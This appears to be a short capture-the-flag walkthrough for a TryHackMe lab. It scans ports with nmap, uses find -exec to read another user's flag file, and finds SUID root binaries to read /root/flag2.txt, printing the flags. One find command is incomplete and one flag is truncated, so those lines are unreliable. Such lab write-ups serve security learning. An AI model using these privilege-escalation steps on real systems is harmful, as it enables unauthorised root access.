Advent of Cyber Day 8

===================================
undermouse | 7th of September, 2020
===================================

```bash
export IP=10.10.222.83
```

#1 	What port is SSH running on?

```bash
# Scanning all ports
nmap $IP -p-

```

```
65534
```


#2 	Find and run a file as igor. Read the file /home/igor/flag1.txt

```bash
find / -exec cat /home/igor/flag1.txt
```

```
THM{d3f0708bdd9accda7f937d013eaf2cd8}
```

#3 	Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?

```bash
find / -user root -perm -4000 -exec ls -ldb {} 2>/dev/null \;
# Found system-control binary file.
system-control
```
Enter system command: `cat /root/flag2.txt`

```
THM{8c8211826239d849fa8d6df03749c3a2
```
	
